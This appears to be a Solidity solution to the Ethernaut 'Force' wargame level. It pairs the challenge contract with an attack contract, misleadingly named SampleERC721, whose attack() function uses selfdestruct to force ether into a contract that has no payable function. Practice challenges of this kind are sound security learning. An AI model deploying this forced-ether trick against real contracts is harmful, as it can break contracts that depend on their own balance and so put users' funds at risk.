// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/


  function getBalance() public view returns(uint){
      return address(this).balance;
  }
  

}
contract SampleERC721  {


  function getBalance() public view returns(uint){
      return address(this).balance;
  }

    function attack(address addr) public payable {
        selfdestruct(payable(addr));
    }

    function getData() public pure returns(bytes memory) {
      //0xa3e76c0f
      return abi.encodeWithSignature("receive()");
    }

    receive() external payable {

    }

    fallback() external payable {

    }
}
